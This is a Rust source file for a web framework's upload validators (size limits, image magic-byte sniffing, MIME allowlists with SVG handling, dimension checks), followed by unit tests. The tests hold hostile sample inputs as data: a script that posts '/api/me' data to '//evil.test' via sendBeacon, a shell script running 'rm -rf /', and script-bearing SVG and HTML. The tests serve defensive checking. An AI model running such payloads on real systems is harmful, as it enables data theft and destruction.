//! Upload validators. Composable via tuple impls - `(ImageFile, MaxSize<N>)`
//! runs both. Implementations are `Default`-constructed inside the
//! derive macro; unit structs auto-impl `Default`, parameterized
//! built-ins use phantom types so a `Default` ctor is meaningful.
//!
//! # Streaming-aware signature
//!
//! Because parts above the configured spill threshold no longer keep their
//! full contents in memory, validators receive a bounded **sniff buffer**
//! (the first ~16 KiB of the part, sufficient for magic-byte detection)
//! plus the **total accumulated size** in bytes. Validators that care
//! about content (e.g. [`ImageFile`], [`MimeType`], [`Dimensions`]) consult
//! `sniff`; validators that care about size (e.g. [`MaxSize`]) consult `size`.
//!
//! # Refusing a file
//!
//! A validator answers in one of two ways. A file it refuses as invalid
//! input returns [`FrameworkError::invalid_upload`] with a catalog-keyed
//! message, which the extractor reports as a 422 under the field's input
//! name. Any other error is a failure to check the file and keeps its own
//! status.

use crate::FrameworkError;
use crate::validation::message::ValidationMessage;

/// Streaming upload validator.
///
/// # Lifecycle
///
/// For each declared `UploadedFile<V>` field on a `#[derive(MultipartRequest)]`
/// struct, the derive macro constructs a single `V` instance via
/// `Default::default()` at the start of request handling and reuses it
/// across **both** [`validate_chunk`](Self::validate_chunk) and
/// [`validate_final`](Self::validate_final) calls for that field.
///
/// # State
///
/// Both methods take `&self`. If your validator needs to accumulate
/// state across chunks (e.g. a rolling hash, a running CRC), use
/// **interior mutability** (`std::cell::Cell`, `std::sync::Mutex`,
/// `std::sync::atomic::*`). Because the same `&V` is threaded through
/// every chunk and the final check, your interior-mutability state
/// is coherent across the entire upload.
///
/// # Composition
///
/// Tuple impls run validators in declaration order:
/// `(ImageFile, MaxSize<5_242_880>)` runs `ImageFile::validate_chunk` first,
/// then `MaxSize::validate_chunk` (per chunk); `validate_final` runs in
/// the same order. Short-circuits on first `Err`.
///
/// # Errors
///
/// Return [`FrameworkError::invalid_upload`] for a file that is invalid
/// input, so the client gets a 422 under the field's name with a message an
/// application can translate. Return any other `FrameworkError` for a
/// failure to check the file; it answers with its own status.
pub trait UploadValidator: Send + Sync + Default {
    /// Called after each chunk lands.
    ///
    /// - `sniff` is the first up to 16 KiB of the part (truncated when
    ///   the part is smaller), sufficient for magic-byte detection via
    ///   `infer::get`. The buffer never grows past 16 KiB regardless of
    ///   part size.
    /// - `size` is the running total of bytes received for this part.
    ///
    /// Return `Err` to short-circuit oversized uploads at the chunk
    /// boundary: the extractor reads no further byte of the body. Size-based
    /// validators (`MaxSize<N>`) check `size`; content-based validators
    /// don't usually need to act per-chunk.
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        let _ = (sniff, size);
        Ok(())
    }

    /// Called once when the part is fully received.
    ///
    /// - `sniff` is the bounded 16 KiB prefix captured during parsing
    ///   (same buffer threaded through `validate_chunk`).
    /// - `size` is the final byte count.
    /// - `content_type` is the client-declared `Content-Type` header.
    ///   Untrusted - content sniffers should rely on `sniff`.
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        content_type: Option<&str>,
    ) -> Result<(), FrameworkError> {
        let _ = (sniff, size, content_type);
        Ok(())
    }
}

/// No-op validator - `UploadedFile<()>` accepts any bytes.
impl UploadValidator for () {}

/// `MaxSize<N>` - short-circuits at byte boundary when accumulated > N.
///
/// A file over the limit is invalid input (`validation-max-file`), reported
/// with the limit in kilobytes as Laravel's `max` rule words it.
#[derive(Default)]
pub struct MaxSize<const N: usize>;

impl<const N: usize> UploadValidator for MaxSize<N> {
    fn validate_chunk(&self, _sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        if size > N as u64 {
            return Err(FrameworkError::invalid_upload(max_file_message(N)));
        }
        Ok(())
    }
    fn validate_final(
        &self,
        _sniff: &[u8],
        size: u64,
        _ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.validate_chunk(&[], size)
    }
}

/// `ImageFile` - accepts a file whose magic bytes are one of the image types
/// Laravel's `image` rule accepts: JPEG, PNG, GIF, BMP, WebP, AVIF, HEIC and
/// HEIF.
///
/// Any other type is refused with `validation-image`, other images included:
/// TIFF, PSD, ICO, JPEG XL and JPEG 2000 are images a browser does not show,
/// and Laravel's rule refuses them for that reason. SVG is markup that can
/// carry script, so it is never an `ImageFile`; accept it on purpose with a
/// [`MimeType`] allowlist that names `image/svg+xml`, as Laravel accepts it
/// only through `image:allow_svg`.
///
/// Named after Laravel's own `Illuminate\Validation\Rules\ImageFile`, which
/// is exactly this rule class. The bare `Image` name belongs to the
/// image-manipulation pipeline in `suprnova::media`, matching
/// `Illuminate\Image\Image`. Deliberately not an intra-doc link: this module
/// is ungated, that type only exists under the `media` feature, and
/// `rustdoc::broken_intra_doc_links` is denied crate-wide - so a link here
/// would break `cargo rustdoc --no-default-features`.
#[derive(Default)]
pub struct ImageFile;

impl UploadValidator for ImageFile {
    fn validate_final(
        &self,
        sniff: &[u8],
        _size: u64,
        _ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        // Unidentifiable bytes are not an image either.
        match accepted_image_type(sniff) {
            Some(_) => Ok(()),
            None => Err(FrameworkError::invalid_upload(
                ValidationMessage::keyed("validation-image").fallback("The file must be an image."),
            )),
        }
    }
}

/// The types [`ImageFile`] accepts, as `infer` names them: the extensions
/// Laravel's `validateImage` lists (`jpg`, `jpeg`, `png`, `gif`, `bmp`,
/// `webp`, `avif`, `heic`, `heif`) as media types. `infer` reports a HEIC
/// file as `image/heif`; `image/heic` is listed so the set reads as
/// Laravel's does.
const IMAGE_TYPES: &[&str] = &[
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/bmp",
    "image/webp",
    "image/avif",
    "image/heic",
    "image/heif",
];

/// The media type of `sniff` when its magic bytes name one of
/// [`IMAGE_TYPES`]. `infer::get` needs at most the first few dozen bytes for
/// these formats, so the bounded sniff buffer always holds enough.
fn accepted_image_type(sniff: &[u8]) -> Option<&'static str> {
    infer::get(sniff)
        .map(|kind| kind.mime_type())
        .filter(|mime| IMAGE_TYPES.contains(mime))
}

/// `MimeType<L>` - accepts a fixed list provided by an allowlist type.
pub trait MimeAllowlist: Send + Sync + Default {
    /// The set of allowed MIME types. An entry may be a `type/*` wildcard,
    /// which admits every subtype of that type except `image/svg+xml`: an
    /// SVG document can carry script, so it passes only when the list
    /// names `image/svg+xml` itself.
    fn allowed() -> &'static [&'static str];
}

/// Whether `mime` is in `allowed`, named exactly or covered by a `type/*`
/// wildcard, as Laravel's `mimetypes` rule matches `image/*`. A wildcard
/// never covers SVG. SVG is markup that can run script where it is served,
/// and Laravel's `image` rule leaves it out unless asked, so only an
/// allowlist that names `image/svg+xml` admits it.
fn mime_allowed(allowed: &[&str], mime: &str) -> bool {
    allowed.iter().any(|pattern| {
        pattern.eq_ignore_ascii_case(mime)
            || (!mime.eq_ignore_ascii_case(SVG)
                && pattern.strip_suffix("/*").is_some_and(|family| {
                    mime.split_once('/').is_some_and(|(actual, subtype)| {
                        !subtype.is_empty() && family.eq_ignore_ascii_case(actual)
                    })
                }))
    })
}

/// Resolve the effective MIME type for a part against an allowlist.
///
/// The detected type from `infer::get` (magic-byte sniffing of the actual
/// content) is authoritative and is matched against `allowed`. The
/// client-declared `Content-Type` is consulted **only** when `infer`
/// cannot recognise the bytes, and only for a type `infer` has no magic
/// bytes for (`text/csv`, `application/json`): a declared `image/png` on
/// bytes `infer` did not recognise as a PNG is a false claim. Markup and
/// script payloads are rejected before the header is read at all, so a
/// text file (SVG, HTML, JS) carrying a spoofed binary header can never
/// satisfy an image allowlist.
///
/// SVG is the one image type that is markup. An allowlist naming
/// `image/svg+xml` accepts a part whose content [`is_svg_document`], and
/// never a part that only declares the type. An `image/*` wildcard does not
/// name it (see [`mime_allowed`]), so an SVG document fails that allowlist
/// as the wrong type.
fn validate_against_allowlist(
    sniff: &[u8],
    size: u64,
    content_type: Option<&str>,
    allowed: &[&str],
) -> Result<(), FrameworkError> {
    let refused = || FrameworkError::invalid_upload(mimetypes_message(allowed));

    // SVG has no magic bytes and is markup, so neither check below can
    // classify it: `infer` reads an XML declaration as `text/xml`, and the
    // markup guard refuses every document that opens with `<`. When the
    // allowlist names SVG, the content itself is examined instead, as magic
    // bytes are for other types, and the header does not decide.
    if mime_allowed(allowed, SVG) && is_svg_document(sniff_content(sniff)) {
        return Ok(());
    }

    if let Some(kind) = infer::get(sniff) {
        // Detected via magic bytes - the content itself, not the header.
        if mime_allowed(allowed, kind.mime_type()) {
            return Ok(());
        }
        return Err(refused());
    }

    // `infer` could not recognise the bytes. Text-based payloads (SVG,
    // HTML, XML, scripts) live here, and they are exactly what an attacker
    // would smuggle behind a spoofed binary `Content-Type`. Reject any
    // part whose leading bytes look like markup or a script before
    // considering the (untrusted) client header at all.
    let content = sniff_content(sniff);
    if looks_like_markup_or_script(content) {
        return Err(refused());
    }
    // Only the first `SNIFF_BYTES` of a part are kept for sniffing. A window
    // of nothing but whitespace says nothing about what follows it, and
    // markup placed past it would otherwise reach the header fallback
    // unseen. A part that is whitespace end to end was seen in full.
    if content.is_empty() && size > sniff.len() as u64 {
        return Err(refused());
    }

    // Genuinely unidentifiable, non-markup bytes: fall back to the client
    // header as the only remaining signal. A missing header is a reject.
    let declared = content_type
        .map(|ct| ct.split(';').next().unwrap_or(ct).trim())
        .filter(|ct| !ct.is_empty())
        .ok_or_else(refused)?;

    // A type `infer` knows the magic bytes of would have been detected
    // above. Bytes it did not recognise are not that type, whatever the
    // header says - script text declared `image/png` is the case this
    // closes, since it carries no markup marker for the check above.
    if infer::is_mime_supported(&declared.to_ascii_lowercase()) {
        return Err(refused());
    }
    // Nor is text an SVG because it says so: an SVG document was accepted
    // above, so whatever reaches here declaring `image/svg+xml` is not one.
    // Without this, script text declared `image/svg+xml` passed an SVG
    // allowlist.
    if declared.eq_ignore_ascii_case(SVG) {
        return Err(refused());
    }

    if !mime_allowed(allowed, declared) {
        return Err(refused());
    }
    Ok(())
}

/// `validation-mimetypes`, naming the allowed types as Laravel's
/// `mimetypes` rule does.
fn mimetypes_message(allowed: &[&str]) -> ValidationMessage {
    let values = allowed.join(", ");
    ValidationMessage::keyed("validation-mimetypes")
        .arg("values", values.clone())
        .fallback(format!("The file must be a file of type: {values}."))
}

/// `validation-max-file` for a limit of `max_bytes`. Laravel's `max` rule
/// takes a file limit in kilobytes and its message repeats that number, so
/// the limit is stated in kilobytes: whole when it divides evenly, else
/// rounded down to two decimal places, so a file within the stated limit
/// always passes.
fn max_file_message(max_bytes: usize) -> ValidationMessage {
    let kilobytes = if max_bytes.is_multiple_of(1024) {
        serde_json::Value::from(max_bytes / 1024)
    } else {
        serde_json::Value::from((max_bytes as f64 / 1024.0 * 100.0).floor() / 100.0)
    };
    ValidationMessage::keyed("validation-max-file")
        .arg("max", kilobytes.clone())
        .fallback(format!(
            "The file must not be greater than {kilobytes} kilobytes."
        ))
}

/// The SVG media type, which [`validate_against_allowlist`] recognises
/// by content because it has no magic bytes.
const SVG: &str = "image/svg+xml";

/// Whether `content` (see [`sniff_content`]) is an SVG document: its root
/// element is `<svg`, after an optional XML declaration, processing
/// instructions, comments and a doctype, with whitespace between them.
/// XML names are case-sensitive, so `<SVG>` is not an SVG root. A prolog
/// that runs past the sniff window leaves no root to see, which reads as
/// not SVG.
fn is_svg_document(mut content: &[u8]) -> bool {
    loop {
        content = content.trim_ascii_start();
        if let Some(rest) = content.strip_prefix(b"<?") {
            let Some(end) = find(rest, b"?>") else {
                return false;
            };
            content = &rest[end + 2..];
        } else if let Some(rest) = content.strip_prefix(b"<!--") {
            let Some(end) = find(rest, b"-->") else {
                return false;
            };
            content = &rest[end + 3..];
        } else if let Some(rest) = content.strip_prefix(b"<!DOCTYPE") {
            let Some(end) = doctype_end(rest) else {
                return false;
            };
            content = &rest[end..];
        } else {
            return content.strip_prefix(b"<svg").is_some_and(|rest| {
                rest.first()
                    .is_some_and(|b| b.is_ascii_whitespace() || *b == b'>' || *b == b'/')
            });
        }
    }
}

/// Where `needle` first starts in `haystack`.
fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

/// The length of a doctype after its `<!DOCTYPE`, through its closing
/// `>`. An internal subset (`[ ... ]`) may hold `>` of its own, so the
/// close is looked for after the subset ends.
fn doctype_end(rest: &[u8]) -> Option<usize> {
    let open = rest.iter().position(|b| *b == b'>' || *b == b'[')?;
    if rest[open] == b'>' {
        return Some(open + 1);
    }
    let close = open + rest[open..].iter().position(|b| *b == b']')?;
    let end = close + rest[close..].iter().position(|b| *b == b'>')?;
    Some(end + 1)
}

/// The sniff buffer past a UTF-8 BOM and leading whitespace, so leading
/// indentation does not defeat the checks that read it.
fn sniff_content(sniff: &[u8]) -> &[u8] {
    let bytes = sniff.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(sniff);
    let start = bytes
        .iter()
        .position(|b| !b.is_ascii_whitespace())
        .unwrap_or(bytes.len());
    &bytes[start..]
}

/// Heuristic: do the leading bytes of `content` (see [`sniff_content`])
/// look like text markup (SVG/HTML/XML) or a script? Used to reject text
/// payloads that `infer` does not recognise before any client-header
/// fallback.
fn looks_like_markup_or_script(content: &[u8]) -> bool {
    // First non-whitespace byte being `<` covers SVG, HTML, XML (incl.
    // `<?xml`, `<!DOCTYPE`, `<svg`, `<html`, `<script`).
    if content.first() == Some(&b'<') {
        return true;
    }
    // Common script shebang.
    content.starts_with(b"#!")
}

/// Upload validator that rejects parts whose effective MIME type is not in
/// the allowlist `L::allowed()`.
///
/// The check is driven by magic-byte sniffing of the actual content; the
/// client-sent `Content-Type` is only ever a fallback for bytes `infer`
/// cannot recognise, and never lets a markup/script payload through.
#[derive(Default)]
pub struct MimeType<L: MimeAllowlist>(std::marker::PhantomData<L>);

impl<L: MimeAllowlist + 'static> UploadValidator for MimeType<L> {
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        validate_against_allowlist(sniff, size, ct, L::allowed())
    }
}

/// The limits a [`Dimensions`] validator checks, Laravel's `dimensions`
/// constraints: `min_width`, `max_width`, `min_height`, `max_height`,
/// `width`, `height` and `ratio`.
///
/// Each method answers `None` (no limit) unless the type overrides it, so a
/// type names only the limits it sets. The limits are functions of the
/// type, as [`MimeAllowlist::allowed`] is, because an upload validator is
/// built with `Default` inside the `MultipartRequest` derive and takes no
/// arguments.
///
/// ```rust
/// use suprnova::{DimensionLimits, Dimensions, ImageFile, MaxSize, UploadedFile};
///
/// #[derive(Default)]
/// struct Avatar;
///
/// impl DimensionLimits for Avatar {
///     fn max_width() -> Option<u32> {
///         Some(1000)
///     }
///     fn ratio() -> Option<f64> {
///         Some(1.0)
///     }
/// }
///
/// type AvatarUpload = UploadedFile<(ImageFile, Dimensions<Avatar>, MaxSize<1_048_576>)>;
/// ```
pub trait DimensionLimits: Send + Sync + Default {
    /// The narrowest width allowed, in pixels.
    fn min_width() -> Option<u32> {
        None
    }

    /// The widest width allowed, in pixels.
    fn max_width() -> Option<u32> {
        None
    }

    /// The shortest height allowed, in pixels.
    fn min_height() -> Option<u32> {
        None
    }

    /// The tallest height allowed, in pixels.
    fn max_height() -> Option<u32> {
        None
    }

    /// The exact width required, in pixels.
    fn width() -> Option<u32> {
        None
    }

    /// The exact height required, in pixels.
    fn height() -> Option<u32> {
        None
    }

    /// The width divided by the height, written as a fraction
    /// (`Some(3.0 / 2.0)`) as Laravel's `ratio=3/2` is. An image passes
    /// when its own ratio is within Laravel's tolerance of one pixel:
    /// `1 / (max((width + height) / 2, height) + 1)`.
    fn ratio() -> Option<f64> {
        None
    }
}

/// `Dimensions<D>` - checks an image's width and height against the limits
/// of `D`, Laravel's `dimensions` rule.
///
/// The width and height come from the image's header in the sniff buffer,
/// without decoding a pixel, for the types [`ImageFile`] accepts. A file
/// that breaks a limit is refused with `validation-dimensions`, and so is a
/// file whose dimensions cannot be read: a type `ImageFile` refuses, an SVG,
/// a corrupt header, or a header that does not end within the first 16 KiB
/// (a JPEG whose metadata segments run past that point). Pair it with
/// [`ImageFile`] so a file that is no image reads `validation-image` first.
#[derive(Default)]
pub struct Dimensions<D: DimensionLimits>(std::marker::PhantomData<D>);

impl<D: DimensionLimits + 'static> UploadValidator for Dimensions<D> {
    fn validate_final(
        &self,
        sniff: &[u8],
        _size: u64,
        _ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        match image_dimensions(sniff) {
            Some((width, height)) if dimensions_fit::<D>(width, height) => Ok(()),
            _ => Err(FrameworkError::invalid_upload(
                ValidationMessage::keyed("validation-dimensions")
                    .fallback("The file has invalid image dimensions."),
            )),
        }
    }
}

/// The width and height an image's header states, for the types
/// [`ImageFile`] accepts. `None` for another type, for a header the sniff
/// buffer does not hold in full, and for a zero side, which no limit can
/// be checked against.
fn image_dimensions(sniff: &[u8]) -> Option<(u32, u32)> {
    let (width, height) = match accepted_image_type(sniff)? {
        "image/bmp" => bmp_dimensions(sniff)?,
        _ => {
            let size = imagesize::blob_size(sniff).ok()?;
            (
                u32::try_from(size.width).ok()?,
                u32::try_from(size.height).ok()?,
            )
        }
    };
    (width > 0 && height > 0).then_some((width, height))
}

/// A BMP's width and height, read as PHP's `getimagesize` reads them: a
/// 12-byte OS/2 header holds two 16-bit sides, and every later header two
/// signed 32-bit sides, where a negative height marks a top-down bitmap
/// and is taken as its absolute value. `imagesize` reads both forms as
/// unsigned 32-bit numbers, which makes a top-down bitmap four billion
/// pixels tall, so BMP is read here.
fn bmp_dimensions(sniff: &[u8]) -> Option<(u32, u32)> {
    let le_u32 = |at: usize| {
        sniff
            .get(at..at + 4)?
            .try_into()
            .ok()
            .map(u32::from_le_bytes)
    };
    let le_i32 = |at: usize| {
        sniff
            .get(at..at + 4)?
            .try_into()
            .ok()
            .map(i32::from_le_bytes)
    };
    let le_u16 = |at: usize| {
        sniff
            .get(at..at + 2)?
            .try_into()
            .ok()
            .map(u16::from_le_bytes)
    };
    match le_u32(14)? {
        12 => Some((u32::from(le_u16(18)?), u32::from(le_u16(20)?))),
        13..=64 | 108 | 124 => Some((u32::try_from(le_i32(18)?).ok()?, le_i32(22)?.unsigned_abs())),
        _ => None,
    }
}

/// Whether a `width` by `height` image meets every limit `D` sets, as
/// Laravel's `failsBasicDimensionChecks` and `failsRatioCheck` decide it.
fn dimensions_fit<D: DimensionLimits>(width: u32, height: u32) -> bool {
    let at_least = |limit: Option<u32>, value: u32| limit.is_none_or(|limit| value >= limit);
    let at_most = |limit: Option<u32>, value: u32| limit.is_none_or(|limit| value <= limit);
    let exactly = |limit: Option<u32>, value: u32| limit.is_none_or(|limit| value == limit);
    at_least(D::min_width(), width)
        && at_most(D::max_width(), width)
        && exactly(D::width(), width)
        && at_least(D::min_height(), height)
        && at_most(D::max_height(), height)
        && exactly(D::height(), height)
        && D::ratio().is_none_or(|ratio| ratio_fits(ratio, width, height))
}

/// Laravel's `failsRatioCheck`, negated: the image's width over height is
/// within `1 / (max((width + height) / 2, height) + 1)` of `ratio`, a
/// tolerance of about one pixel, so a 1001 by 1000 image is not square.
fn ratio_fits(ratio: f64, width: u32, height: u32) -> bool {
    let (width, height) = (f64::from(width), f64::from(height));
    let precision = 1.0 / (((width + height) / 2.0).max(height) + 1.0);
    (ratio - width / height).abs() <= precision
}

/// Tuple composition. `Default` for tuples up to 12 is provided by std.
impl<A, B> UploadValidator for (A, B)
where
    A: UploadValidator,
    B: UploadValidator,
{
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        self.0.validate_chunk(sniff, size)?;
        self.1.validate_chunk(sniff, size)
    }
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.0.validate_final(sniff, size, ct)?;
        self.1.validate_final(sniff, size, ct)
    }
}

impl<A, B, C> UploadValidator for (A, B, C)
where
    A: UploadValidator,
    B: UploadValidator,
    C: UploadValidator,
{
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        self.0.validate_chunk(sniff, size)?;
        self.1.validate_chunk(sniff, size)?;
        self.2.validate_chunk(sniff, size)
    }
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.0.validate_final(sniff, size, ct)?;
        self.1.validate_final(sniff, size, ct)?;
        self.2.validate_final(sniff, size, ct)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// PNG magic bytes followed by enough of an IHDR header that
    /// `infer::get` recognises the part as `image/png`.
    const PNG_HEADER: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00,
    ];

    #[derive(Default)]
    struct OnlyPng;
    impl MimeAllowlist for OnlyPng {
        fn allowed() -> &'static [&'static str] {
            &["image/png"]
        }
    }

    fn run(sniff: &[u8], ct: Option<&str>) -> Result<(), FrameworkError> {
        MimeType::<OnlyPng>::default().validate_final(sniff, sniff.len() as u64, ct)
    }

    #[test]
    fn genuine_png_passes() {
        assert!(run(PNG_HEADER, Some("image/png")).is_ok());
        // Detection is byte-driven; even a missing/wrong header passes
        // because the magic bytes are authoritative.
        assert!(run(PNG_HEADER, None).is_ok());
        assert!(run(PNG_HEADER, Some("application/octet-stream")).is_ok());
    }

    #[test]
    fn svg_with_spoofed_png_header_is_rejected() {
        let svg = br#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
        let err = run(svg, Some("image/png")).expect_err("spoofed SVG must be rejected");
        assert_eq!(err.status_code(), 422);
    }

    #[test]
    fn html_with_spoofed_png_header_is_rejected() {
        let html = b"<!DOCTYPE html><html><body><script>steal()</script></body></html>";
        assert!(run(html, Some("image/png")).is_err());
        // Leading whitespace must not defeat the markup check.
        let padded = b"   \n\t<html></html>";
        assert!(run(padded, Some("image/png")).is_err());
    }

    #[test]
    fn script_shebang_with_spoofed_header_is_rejected() {
        let script = b"#!/bin/sh\nrm -rf /\n";
        assert!(run(script, Some("image/png")).is_err());
    }

    #[derive(Default)]
    struct OnlyCsv;
    impl MimeAllowlist for OnlyCsv {
        fn allowed() -> &'static [&'static str] {
            &["text/csv"]
        }
    }

    fn run_csv(sniff: &[u8], size: u64, ct: Option<&str>) -> Result<(), FrameworkError> {
        MimeType::<OnlyCsv>::default().validate_final(sniff, size, ct)
    }

    #[test]
    fn unidentifiable_bytes_fall_back_to_the_header_only_for_types_magic_cannot_detect() {
        // `text/csv` has no magic bytes, so for bytes infer cannot
        // classify the client header is the only signal left.
        let csv = b"name,email\nann,ann@example.com\n";
        assert!(run_csv(csv, csv.len() as u64, Some("text/csv")).is_ok());
        assert!(run_csv(csv, csv.len() as u64, Some("text/csv; charset=utf-8")).is_ok());
        // Wrong / missing header on unidentifiable bytes is rejected.
        assert!(run_csv(csv, csv.len() as u64, Some("text/plain")).is_err());
        assert!(run_csv(csv, csv.len() as u64, None).is_err());

        // `image/png` does have magic bytes. Bytes infer cannot classify
        // are therefore not a PNG, whatever the header claims.
        let opaque = &[0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        assert!(run(opaque, Some("image/png")).is_err());
        assert!(run(opaque, Some("IMAGE/PNG; charset=binary")).is_err());
    }

    /// Script text carries no `<` or `#!` marker, so the markup check
    /// alone let it through on a spoofed image header.
    #[test]
    fn script_text_behind_a_spoofed_image_header_is_rejected() {
        let script = b"fetch('/api/me').then(r => r.text()).then(t => navigator.sendBeacon('//evil.test', t));";
        let err = run(script, Some("image/png")).expect_err("script text is not a PNG");
        assert_eq!(err.status_code(), 422);
    }

    /// Only the first 16 KiB of a part is sniffed. A sniff window of pure
    /// whitespace says nothing about what follows it, so markup placed
    /// past the window must not reach the header fallback.
    #[test]
    fn content_hidden_past_a_whitespace_sniff_window_is_rejected() {
        let window = vec![b' '; 16 * 1024];
        assert!(
            run_csv(&window, window.len() as u64 + 64, Some("text/csv")).is_err(),
            "the bytes after the window were never inspected"
        );
        // A part that is whitespace end to end was inspected in full.
        assert!(run_csv(&window, window.len() as u64, Some("text/csv")).is_ok());
    }

    #[derive(Default)]
    struct OnlySvg;
    impl MimeAllowlist for OnlySvg {
        fn allowed() -> &'static [&'static str] {
            &["image/svg+xml"]
        }
    }

    fn run_svg(content: &[u8], ct: Option<&str>) -> Result<(), FrameworkError> {
        MimeType::<OnlySvg>::default().validate_final(content, content.len() as u64, ct)
    }

    /// `infer` has no magic bytes for SVG, so the header fallback admitted
    /// any non-markup text declared `image/svg+xml`. An SVG allowlist must
    /// now see an actual SVG document, and anything else fails as the wrong
    /// type.
    #[test]
    fn text_declared_svg_that_is_not_svg_is_the_wrong_type() {
        let script = b"fetch('/api/me').then(r => r.text()).then(t => navigator.sendBeacon('//evil.test', t));";
        assert_eq!(
            refused_key(run_svg(script, Some("image/svg+xml"))),
            "validation-mimetypes"
        );
        // Markup whose root element is not `<svg>` is no SVG either.
        for not_svg in [
            &b"<html><body><script>steal()</script></body></html>"[..],
            b"<?xml version=\"1.0\"?><root><svg/></root>",
            b"<!-- <svg> --><div/>",
            b"<SVG xmlns=\"http://www.w3.org/2000/svg\"/>",
            b"<svgx/>",
            b"",
        ] {
            assert_eq!(
                refused_key(run_svg(not_svg, Some("image/svg+xml"))),
                "validation-mimetypes",
                "{}",
                String::from_utf8_lossy(not_svg)
            );
        }
    }

    /// An SVG document passes an SVG allowlist: the root element is
    /// `<svg>` after an optional BOM, whitespace, XML declaration,
    /// comments and doctype. Like magic bytes, the content decides, not
    /// the header.
    #[test]
    fn an_svg_document_passes_an_svg_allowlist() {
        for svg in [
            &b"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 1 1\"/>"[..],
            b"\xEF\xBB\xBF  \n<svg>\n</svg>",
            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- made by hand -->\n<svg width=\"1\"></svg>",
            b"<?xml version=\"1.0\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg/>",
            b"<!DOCTYPE svg [ <!ENTITY a \"b\"> ]>\n<svg\tversion=\"1.1\"/>",
        ] {
            assert!(
                run_svg(svg, Some("image/svg+xml")).is_ok(),
                "{}",
                String::from_utf8_lossy(svg)
            );
            assert!(
                run_svg(svg, None).is_ok(),
                "the content decides: {}",
                String::from_utf8_lossy(svg)
            );
        }
        // An SVG is still refused by an allowlist that does not name SVG.
        let svg = b"<svg xmlns=\"http://www.w3.org/2000/svg\"/>";
        assert!(run(svg, Some("image/svg+xml")).is_err());
    }

    /// A `type/*` wildcard admits every subtype of its type except SVG,
    /// which only an allowlist that names `image/svg+xml` admits.
    #[test]
    fn a_wildcard_admits_every_subtype_but_svg() {
        assert!(mime_allowed(&["image/*"], "image/png"));
        assert!(mime_allowed(&["IMAGE/*"], "image/webp"));
        assert!(!mime_allowed(&["image/*"], SVG));
        assert!(!mime_allowed(&["image/*"], "IMAGE/SVG+XML"));
        assert!(!mime_allowed(&["image/*"], "image/"), "an empty subtype");
        assert!(mime_allowed(&["image/svg+xml"], SVG));
        assert!(mime_allowed(&["image/*", "IMAGE/SVG+XML"], SVG));
        // The other families are unchanged.
        assert!(mime_allowed(&["text/*"], "text/xml"));
        assert!(mime_allowed(&["application/*"], "application/pdf"));
        assert!(!mime_allowed(&["application/*"], "image/png"));
    }

    fn refused_key(result: Result<(), FrameworkError>) -> String {
        match result {
            Err(FrameworkError::InvalidUpload(message)) => message.key.into_owned(),
            other => panic!("expected a refused file, got {other:?}"),
        }
    }

    #[test]
    fn built_in_refusals_are_validation_failures_with_catalog_keys() {
        assert_eq!(
            refused_key(MaxSize::<2048>.validate_chunk(&[], 2049)),
            "validation-max-file"
        );
        assert_eq!(
            refused_key(ImageFile.validate_final(b"%PDF-1.4", 8, None)),
            "validation-image"
        );
        assert_eq!(
            refused_key(ImageFile.validate_final(&[0u8; 8], 8, None)),
            "validation-image"
        );
        assert_eq!(
            refused_key(run(b"<svg/>", Some("image/png"))),
            "validation-mimetypes"
        );
        assert_eq!(
            refused_key(run(&[1u8, 2, 3, 4], None)),
            "validation-mimetypes"
        );
    }

    #[test]
    fn the_messages_carry_laravels_arguments() {
        assert_eq!(max_file_message(2048).args["max"], serde_json::json!(2));
        // Rounded down: a file within the stated limit always passes.
        assert_eq!(max_file_message(1000).args["max"], serde_json::json!(0.97));
        assert_eq!(
            mimetypes_message(&["image/png", "image/jpeg"]).args["values"],
            "image/png, image/jpeg"
        );
    }
}
